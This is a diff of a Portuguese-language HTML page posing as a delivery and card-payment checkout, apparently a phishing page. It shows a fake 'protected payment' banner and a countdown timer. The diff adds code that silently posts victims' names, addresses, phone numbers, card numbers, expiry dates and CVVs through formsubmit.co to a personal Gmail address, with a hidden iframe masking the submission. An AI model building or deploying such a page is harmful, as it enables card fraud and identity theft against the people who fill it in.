@@ -1,147 +1,130 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Envio e Pagamento</title>
+  <title>Entrega e Pagamento</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
     body {
+      margin: 0;
+      padding: 0;
       font-family: Arial, sans-serif;
-      background: #f2f2f2;
+      background: #f5f5f5;
     }
-
     .container {
-      width: 100%;
-      max-width: 100%;
-      padding: 20px;
-      background: #fff;
+      width: 100vw;
       min-height: 100vh;
+      padding: 30px 20px;
+      box-sizing: border-box;
+      background: white;
     }
-
     h2 {
-      margin-bottom: 20px;
-      text-align: center;
-      color: #333;
+      font-size: 24px;
+      margin-bottom: 10px;
     }
-
-    input {
-      width: 100%;
-      margin-bottom: 12px;
-      padding: 14px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 16px;
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
     }
-
-    button {
-      background: #f60;
-      color: white;
-      padding: 14px;
-      border: none;
-      width: 100%;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-
-    .alerta {
-      background: #fff4cc;
+    input, select, button {
       padding: 12px;
-      border-radius: 5px;
-      font-size: 15px;
-      margin-bottom: 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
     }
-
-    .tempo {
-      color: #f60;
+    button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
       font-weight: bold;
     }
-
-    .valor {
-      font-size: 24px;
-      color: #333;
-      margin: 10px 0;
+    .alerta {
+      background: #ffeeba;
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 8px;
+      font-weight: bold;
+      color: #856404;
     }
-
-    #pagamento {
-      display: none;
+    .valor {
+      font-size: 22px;
+      font-weight: bold;
+      color: green;
+    }
+    .tempo {
+      font-weight: bold;
+      color: red;
     }
   </style>
 </head>
 <body>
 
-  <!-- TELA 1 -->
-  <div class="container" id="formulario">
+  <!-- TELA 1: DADOS DE ENTREGA -->
+  <div class="container" id="entrega">
     <h2>Preencha seus dados de entrega</h2>
-    <form id="envioForm" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" target="dummyframe">
-      <!-- Oculta captcha e redirecionamento -->
+    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" target="dummyframe">
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_next" value="about:blank">
+      <input type="hidden" name="Etapa" value="Entrega">
 
       <input type="text" name="Nome completo" placeholder="Nome completo" required>
-      <input type="text" name="Endereço" placeholder="Endereço completo" required>
-      <input type="text" name="Bairro" placeholder="Bairro" required>
+      <input type="text" name="Endereço" placeholder="Endereço (Rua, Número, Bairro)" required>
       <input type="text" name="Cidade" placeholder="Cidade" required>
+      <input type="text" name="Estado" placeholder="Estado" required>
       <input type="text" name="CEP" placeholder="CEP" required>
-      <input type="tel" name="WhatsApp" placeholder="WhatsApp" required>
-      <button type="submit">Continuar</button>
+      <input type="tel" name="Telefone" placeholder="Telefone / WhatsApp" required>
+      <button type="submit" onclick="proximaTela()">Continuar para Pagamento</button>
     </form>
-    <!-- iframe invisível para evitar recarregamento -->
-    <iframe name="dummyframe" style="display:none;"></iframe>
   </div>
 
-  <!-- TELA 2 - CARTÃO -->
-  <div class="container" id="pagamento">
+  <!-- TELA 2: PAGAMENTO -->
+  <div class="container" id="pagamento" style="display:none;">
     <div class="alerta">
       ⚠️ Seus dados estão protegidos. O pagamento é processado por <strong>AVERIOPAY</strong>.
     </div>
 
-    <p><strong>Tempo restante para concluir o pagamento:</strong> <span class="tempo" id="contador">04m 39s</span></p>
+    <p><strong>Tempo restante para concluir o pagamento:</strong> <span class="tempo" id="contador">05m 00s</span></p>
 
     <div style="margin-top: 15px;">
       <p><strong>Valor:</strong></p>
       <p class="valor">R$ 2.000,00</p>
     </div>
 
-    <form>
-      <input type="text" placeholder="Nome no cartão" required>
-      <input type="text" placeholder="Número do cartão" maxlength="19" required>
-      <input type="text" placeholder="Validade (MM/AA)" maxlength="5" required>
-      <input type="text" placeholder="CVV" maxlength="4" required>
+    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" target="dummyframe">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="about:blank">
+      <input type="hidden" name="Etapa" value="Pagamento com Cartão">
+
+      <input type="text" name="Nome no Cartão" placeholder="Nome no cartão" required>
+      <input type="text" name="Número do Cartão" placeholder="Número do cartão" maxlength="19" required>
+      <input type="text" name="Validade" placeholder="Validade (MM/AA)" maxlength="5" required>
+      <input type="text" name="CVV" placeholder="CVV" maxlength="4" required>
       <button type="submit">Pagar com Cartão</button>
     </form>
   </div>
 
+  <iframe name="dummyframe" style="display:none;"></iframe>
+
   <script>
-    const form = document.getElementById("envioForm");
-    const formulario = document.getElementById("formulario");
-    const pagamento = document.getElementById("pagamento");
-    const contador = document.getElementById("contador");
+    function proximaTela() {
+      event.preventDefault(); // Impede o envio imediato
+      document.getElementById("entrega").style.display = "none";
+      document.getElementById("pagamento").style.display = "block";
+      iniciarContador();
+    }
 
-    form.addEventListener("submit", function() {
-      setTimeout(() => {
-        formulario.style.display = "none";
-        pagamento.style.display = "block";
-        window.scrollTo(0, 0);
-        iniciarContador(279); // 4m39s
-      }, 1000);
-    });
-
-    function iniciarContador(segundos) {
+    function iniciarContador() {
+      let tempo = 300; // 5 minutos
+      const contador = document.getElementById("contador");
       const interval = setInterval(() => {
-        const min = Math.floor(segundos / 60);
-        const sec = segundos % 60;
-        contador.textContent = `${String(min).padStart(2, '0')}m ${String(sec).padStart(2, '0')}s`;
-        segundos--;
-        if (segundos < 0) {
-          clearInterval(interval);
-          contador.textContent = "Expirado";
-        }
+        const minutos = String(Math.floor(tempo / 60)).padStart(2, '0');
+        const segundos = String(tempo % 60).padStart(2, '0');
+        contador.textContent = `${minutos}m ${segundos}s`;
+        tempo--;
+        if (tempo < 0) clearInterval(interval);
       }, 1000);
     }
   </script>
-
 </body>
 </html>
